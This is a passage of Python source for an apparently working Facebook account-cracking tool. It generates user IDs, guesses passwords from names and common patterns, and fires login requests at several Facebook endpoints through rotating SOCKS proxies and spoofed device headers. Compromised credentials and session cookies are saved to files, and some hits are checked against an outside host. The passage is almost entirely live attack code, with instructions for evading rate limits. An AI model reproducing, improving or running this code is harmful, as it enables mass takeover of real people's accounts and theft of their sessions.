    jalan(f'\033[1;31m[\033[1;37m2\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM2\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mB-GRAPH\x1b[38;5;196m]')
    jalan(f'\033[1;31m[\033[1;37m3\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM3\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mFREE\x1b[38;5;196m]')
    jalan(f'\033[1;31m[\033[1;37m4\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM4\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mWEB\x1b[38;5;196m]')
    jalan(f'\033[1;31m[\033[1;37m5\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM5\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mP Facebook\x1b[38;5;196m]')
    jalan('  \033[10;32m═══════════════════════════════════════════════════')
    try:
        mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
        if mthd not in ['1', '2', '3', '4', '5', '01', '02', '03', '04', '05']:
            raise ValueError
    except ValueError:
        mthd = '1'
        jalan(f'\033[1;31m[\033[1;37m!\033[1;31m]\033[1;37m INVALID METHOD! SETTING TO METHOD 1')
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    
    with tred(max_workers=90) as samira:
        clear()
        tl = str(len(user))
        print(logo)
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        jalan('  \033[10;32m═══════════════════════════════════════════════════')
        for psx in user:
            uid = code + psx
            passlist = [psx, uid, uid[3:], uid[4:], uid[5:], uid[:8], uid[:7], uid[:6], '@#@#@#', '@#1234']
            if mthd in ['1', '01']:
                samira.submit(rndm1, uid, passlist)
            elif mthd in ['2', '02']:
                samira.submit(rndm2, uid, passlist)
            elif mthd in ['3', '03']:
                samira.submit(rndm3, uid, passlist)
            elif mthd in ['4', '04']:
                samira.submit(rndm4, uid, passlist)
            elif mthd in ['5', '05']:
                samira.submit(rndm5, uid, passlist)
            else:
                samira.submit(rndm1, uid, passlist)
    jalan('\033[1;37m')
    jalan('  \033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    jalan(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    jalan(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    jalan(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    jalan('  \033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()
#───────────────[ INPUT-FILE_NAME ]───────────────#
def crack_file():
    jalan('\033[97;1m[\033[92;1m+\033[95;1m] Example File Name : \033[92;1m /sdcard/game.txt')
    o = input('\033[97;1m[\033[92;1m+\033[92;1m] INPUT FILE NAME  : \033[92;1m ')
    clear()
    print(logo)
    try:
        lin = open(o).read().splitlines()
    except FileNotFoundError:
        animation(' FILE NOT FOUND')
        time.sleep(1) 
        os.system("clear")
        print(logo)
        crack_file()
        return
    for xid in lin:
        id.append(xid)
    setting()
    clear()
#───────────────[ CLONING-IDZ ]───────────────#
def setting():
    jalan("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mCLONING FOR ONLY OLD IDz")
    jalan("\033[97;1m[\033[92;1m2\033[97;1m] CLONING FOR ONLY NEW IDz")
    jalan("\033[97;1m[\033[92;1m3\033[97;1m] \033[0;92mCLONING FOR MIX IDz")
    jalan('  \033[1;32m═══════════════════════════════════════════════════')
    hu = input('\033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    clear()
    print(logo)
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    jalan("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [B-API]\033[1;37m")
    jalan("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [B-Graph]\033[1;37m")
    jalan("\033[97;1m[\033[92;1m3\033[97;1m] METHOD 3 [P Facebook]\033[1;37m")
    jalan("\033[97;1m[\033[92;1m4\033[97;1m] METHOD 4 [M Facebook]\033[1;37m")
    jalan('  \033[10;32m═══════════════════════════════════════════════════')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    elif hc in ['3','03']:
        method.append('touch')
    elif hc in ['4','04']:
        method.append('host')    
    else:
        method.append('host')
    passwrd()
    exit()
#───────────────[ FILE-WORDLIST ]───────────────#
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mUSER NAME\033[1;91m    \033[0;97m:\033[38;5;208m "+uname)
    print('\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mYOUR TOTAL UID  \033[0;97m:\033[1;96m', str(len(id)))
    print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;92m TURN \033[1;37m[\033[1;92mON\033[1;31m/\033[1;92mOFF\033[1;37m]\033[1;92m AIRPLANE MODE EVERY 5 MIN')
    jalan('  \033[10;32m═══════════════════════════════════════════════════')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            nmf = yuzong.split('|')[1].lower()
            idf = yuzong.split('|')[0]
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '1')
                    pwv.append(frs + '11')
                    pwv.append(frs + '12')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(nmf)
                    pwv.append('i love you')
                    pwv.append(frs + '@')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '@#123')
                    pwv.append(frs + '@12')
                    pwv.append(frs + '@123')
                    pwv.append(frs+ '@1234')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '111')
                    pwv.append('@'+frs+'1122')
                    pwv.append('@'+frs+'#')
                    pwv.append('@@'+frs+'@@')
                    pwv.append('@'+frs+'@1122')
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs + '1')
                    pwv.append(frs + '11')
                    pwv.append(frs + '12')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(nmf)
                    pwv.append('i love you')
                    pwv.append(frs + '@')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '@#123')
                    pwv.append(frs + '@12')
                    pwv.append(frs + '@123')
                    pwv.append(frs+ '@1234')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '111')
                    pwv.append('@'+frs+'1122')
                    pwv.append('@'+frs+'#')
                    pwv.append('@@'+frs+'@@')
                    pwv.append('@'+frs+'@1122')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
            elif 'host' in method:
                pool.submit(crackhost, idf, pwv)
            else:
                pool.submit(crackhost, idf, pwv)
    jalan('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+tag)
    jalan('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s ' % (oks))
    jalan('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s ' % (cps))
    jalan('  \033[10;32m═══════════════════════════════════════════════════')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    menu()
    exit()
#───────────────[ OLD - CLONE - METHOD ]───────────────#
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mEMON🌺PAGLA\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        ual = random.choice(user_agents)
        ual = random.choice(uadef)
        ual = random.choice(ugen2)
        prox = random.choice(proxy)
        max = {'http': 'socks4://' + prox}
        for pw in ["123456","1234567","12345678","123456789","87654321","987654321","654321","123123","asdfgh","asdf1234","Asdf1234","qwerty","Qwerty","qwerty1234","Asdf123", "112233", "1234567890", "987654321", "0987654321"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ual, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers, proxies=max).json()
            if "session_key" in rp:
                print(f"\r\r [EMON PAGLA 🍬OK-ID] {uid} • {pw}")
                open("/sdcard/Emon-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r {RED}[CP-ID] {uid} • {pw}")
                open("/sdcard/EmonN-OLD-CP.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r {pink}[VERIFICATION-NEED] {uid} • {pw}")
                open("/sdcard/Emon-OLD-2F.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
#───────────────[ FILE METODE-M1 ]───────────────#
def crack(idf, pwv):
    global loop, ok, cp, cps, oks
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua = random.choice(ugen2)
    ua = random.choice(uadef)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(proxy)
            max_proxy = {'http': 'socks4://' + nip}
            data = {
                'adid': str(uuid.uuid4()),
                'email': idf,
                'password': pw,
                'cpl': 'true',
                'credentials_type': 'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                "locale": "en_US",
                "client_country_code": "US",
                'device_id': str(uuid.uuid4()),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
            }
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-type': 'WIFI',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': ua,
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-friendly-name': 'authenticate',
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }
            response = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers, proxies=max_proxy, allow_redirects=False)
            response_text = response.text
            q = json.loads(response_text)
            
            if "checkpoint" in q:
                print(f'\r\x1b[1;96m[Emon😭-CP] \x1b[38;5;205m {idf} | {pw}')
                with open('/sdcard/-FILE-CP.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n')
                cps.append(idf)
                cp += 1
                break
            elif "c_user" in q:
                ok += 1
                cookies = ses.cookies.get_dict()
                cookie_string = ";".join([f"{key}={value}" for key, value in cookies.items()])
                print(f'\r\x1b[1;96m[Emon🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{cookie_string} ')
                with open('/sdcard/Emon-FILE-M1-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {cookie_string}\n')
                oks.append(idf)
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#───────────────[ FILE CLONE METHODE-2 ]───────────────#
def crackfree(idf, pwv):
    global loop, ok, cp, cps, oks
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua = random.choice(ugen2)
    ua = random.choice(uadef)
    ses = requests.Session()
    
    for pw in pwv:
        try:
            nip = random.choice(proxy)
            max_proxy = {'http': 'socks4://' + nip}
            data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': idf,
            'password': pw,
            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            p = requests.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, proxies=max_proxy, allow_redirects=False).text
            q = json.loads(p)
            if "checkpoint" in q:
                print(f'\r\x1b[1;96m[Emon-CP] \x1b[38;5;205m {idf} | {pw}')
                with open('/sdcard/x-FILE-CP.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n')
                cps.append(idf)
                cp += 1
                break
            elif "c_user" in q:
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ";".join([f"{key}={value}" for key, value in coki.items()])
                print(f'\r\x1b[1;96m[Emon🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                with open('/sdcard/Emon-FILE-M2-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                oks.append(idf)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass
    loop += 1
#───────────────[ FILE CLONE METODE_3 ]───────────────#
def cracktouch(idf, pwv):
    global cp, ok, loop
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua = random.choice(ugen2)
    ua = random.choice(uadef)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(proxy)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({
                'Host': 'p.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://p.facebook.com/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })
            p = ses.get(f'https://p.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            koki = '; '.join([f'{key}={value}' for key, value in p.cookies.get_dict().items()]) + ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'p.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://p.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://p.facebook.com/login.php?next=https%3A%2F%2Fp.facebook.com%2F&refsrc=deprecated&wtsid=rdr_0rUMBKuFVOobOGUjz&_rdr',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            }
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[Emon-CP] \x1b[38;5;205m {idf} | {pw}')
                with open('/sdcard/Emon-FILE-CP.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n')
                akun.append(f'{idf}|{pw}')
                cp += 1
            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = '; '.join([f'{key}={value}' for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[1;96m[SHAJON-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                with open('/sdcard/SHAJON-FILE-M3-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                ok.append(idf)
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass 
    loop += 1
#───────────────[ FILE CLONE METODE_4 ]───────────────#
def crackhost(idf, pwv):
    global cp, ok, loop
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M4\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(uadef)
    ses = requests.Session()
    for pw in pwv:
        nip = random.choice(proxy)
        proxs = {'http': 'socks4://' + nip}
        ses.headers.update({
            'Host': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
        })
        try:
            p = ses.get(f'https://p.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr')
            lsd = re.search('name="lsd" value="(.*?)"', str(p.text)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1)
            dataa = {
                'lsd': lsd,
                'jazoest': jazoest,
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            koki = '; '.join([f'{key}={value}' for key, value in p.cookies.get_dict().items()]) + ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            }
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
            if 'checkpoint' in po.cookies.get_dict().keys():
                cp += 1
                print(f'\r\x1b[1;96m[Emon-CP] \x1b[38;5;205m {idf} | {pw}')
                with open('/sdcard/X-FILE-CP.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n')
                cp.append(idf)
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = '; '.join([f'{key}={value}' for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[1;96m[Emon🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                linex()
                with open('/sdcard/Emon-FILE-M4-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                cek_apk(kuki)
                ok.append(idf)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid, passlist):
    global loop
    global oks
    global cps
    global proxy
    global ugen
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f'\r\r{B}[{G} EMON PAGLA 🍬-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            uax = random.choice(uadef)
            uax = random.choice(user_agents)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())

            datax = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'logged_out_id': str(uuid.uuid4()),
                'hash_id': str(uuid.uuid4()),
                'reg_instance': str(uuid.uuid4()),
                'session_id': str(uuid.uuid4()),
                'advertiser_id': str(uuid.uuid4()),
                'email': uid,
                'password': pas,
                'generate_analytics_claims': '1',
                'source':'login',
                'sim_country': 'id',
                'network_country': 'id',
                'relative_url': 'method/auth.login',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {'authority': 'www.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.facebook.com/?_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Google Chrome";v="130", "Chromium";v="130"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="130", "Chromium";v="130"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '"TECNO KL5"',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'manifest',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Wayland like X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6784.66 Safari/537.36',}
            url = 'https://api.facebook.com/method/auth.login'
            po = requests.post(url, data=datax, headers=headers, proxies=max).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                res = requests.get(f'https://rajx.pythonanywhere.com/live?uid={uid}').text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[Emon 🔥-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                    with open('/sdcard/Emon-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;31;40m|SHAJON-S1-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                print(f'\r\r{B}[{Y}CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/-S1-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid, passlist):
    global loop
    global oks
    global cps
    global proxy
    bo = random.choice([m, k, h, b, u, x])
